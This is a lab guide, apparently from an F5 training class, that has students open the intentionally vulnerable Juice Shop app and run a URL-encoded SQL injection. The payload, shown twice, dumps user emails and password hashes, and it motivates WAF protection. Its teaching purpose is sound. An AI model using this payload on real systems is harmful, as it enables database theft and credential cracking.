.. role:: red
.. role:: bred

The Juiceshop Application
================================================================================

We will start by establishing an RDP session to the **Ubuntu 18.04 Client**.

-  Start an RDP session to the **Ubuntu 18.04 CLient** (Components > Ubuntu18.04 Client > ACCESS > XRDP)

   .. image:: ../images/udf-ubuntu-client-rdp.png
      :alt: UDF Ubuntu Client RDP 

-  When prompted, save the RDP file to your local machine and then open it to connect.
-  At the Ubuntu Login prompt, click on the **OK** button to continue.

   .. image:: ../images/udf-ubuntu-client-rdp2.png
      :alt: UDF Ubuntu XRDP


   .. tip:: If the RDP session times out, refer to the `User Credentials <https://github.com/Doctorwooo/f5-agility-labs-sslviz/blob/master/docs/class2/labinfo.rst>`_ for the **student** user password.

-  Open the **Firefox** browser
-  Click on the **Juiceshop** bookmark on the browser bar

   .. image:: ../images/juiceshop-bookmark.png

-  Accept the security risk by clicking **Advanced** and **Accept the Risk and Continue**. This is due to the BIGIP using a self-signed certificate.

   .. image:: ../images/certificate-risk.png

Here is the vulnerable Juiceshop application. Next, we will try a simple SQL injection attack that will illustrate why WAF protection is necessary.

  .. image:: ../images/juiceshop-rdp.png

-  Copy and Paste the following path in your browser's location bar after https://10.1.20.200/

  .. code-block:: none
   
    /rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

-  The browser's location bar should look like this:

  .. code-block:: none

    https://10.1.20.200/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

This will cause the application to dump a list of users in the database to include their hashed passwords. **YIKES!**

  .. image:: ../images/juiceshop-sql.png


  .. warning:: An attacked could easily grab the hashed passwords and decrypt in a free password hash cracker widely available on the internet. We will take steps to protect this insecure application using SSL Orchestrator and WAFaaS. 
